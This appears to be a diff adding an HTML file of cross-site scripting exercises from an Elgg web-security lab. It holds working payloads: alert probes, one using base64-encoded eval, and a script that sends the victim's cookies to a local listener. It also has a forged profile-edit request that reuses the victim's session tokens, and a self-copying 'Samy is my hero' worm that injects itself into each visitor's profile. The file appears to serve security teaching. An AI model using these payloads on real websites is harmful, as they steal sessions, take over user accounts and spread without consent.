@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <!-- test1 -->
+    <img onerror="alert(document.cookie)" src=x />
+    <!-- test2 -->
+    <video src=_ onloadstart="eval(atob('YWxlcnQoJ1hTU1Rlc3QnKQ=='))"></video>
+</body>
+<!-- test3 -->
+<script>
+    alert(escape(document.cookie));
+</script>
+
+
+<!-- task1 -->
+<script>document.write('<img src=http://127.0.0.1:5555?c=' + escape(document.cookie) + '>'); </script>
+<!-- task2 -->
+<script>
+    window.onload = function () {
+        var ts = elgg.security.token.__elgg_ts;
+        var token = elgg.security.token.__elgg_token;
+        var guid = elgg.session.user.guid;
+        fetch('http://www.xsslabelgg.com/action/profile/edit', {
+            credentials: 'include',
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                __elgg_ts: ts,
+                __elgg_token: token,
+                guid: guid,
+                briefdescription: "Samy is my hero",
+            })
+        })
+    }
+</script>
+
+<!-- task3 -->
+<script id='worm'>
+    setTimeout(() => {
+        var ts = elgg.security.token.__elgg_ts;
+        var token = elgg.security.token.__elgg_token;
+        var guid = elgg.session.user.guid;
+        fetch('http://www.xsslabelgg.com/action/profile/edit', {
+            credentials: 'include',
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                __elgg_ts: ts,
+                __elgg_token: token,
+                guid: guid,
+                briefdescription: "Samy is my hero",
+                description: "<script id='worm'>" + document.getElementById('worm').innerHTML + "<\/script>"
+            })
+        })
+    }, 3000)
+</script>
+
+</html>
